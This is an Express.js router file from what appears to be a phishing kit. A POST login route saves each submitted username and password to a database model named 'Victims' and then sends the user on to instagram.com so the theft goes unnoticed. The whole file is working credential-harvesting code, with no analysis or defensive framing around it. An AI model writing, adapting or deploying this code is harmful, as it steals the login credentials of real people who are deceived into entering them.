const Victims = require("../model/Victims");

const router = require("express").Router();

router.get("/", (req, res) => {
    try {
        return res.render("login", { pageTitle: "Welcome", req });
    }
    catch (err) {
        return res.redirect("/");
    }
});

router.post("/login", async (req, res) => {
    try {
        const { username, password } = req.body;
        const newDoc = new Victims({
            username,
            password
        });
        await newDoc.save();
        res.redirect("https://instagram.com/")
    }
    catch (err) {
        return res.redirect("/");
    }
})





module.exports = router;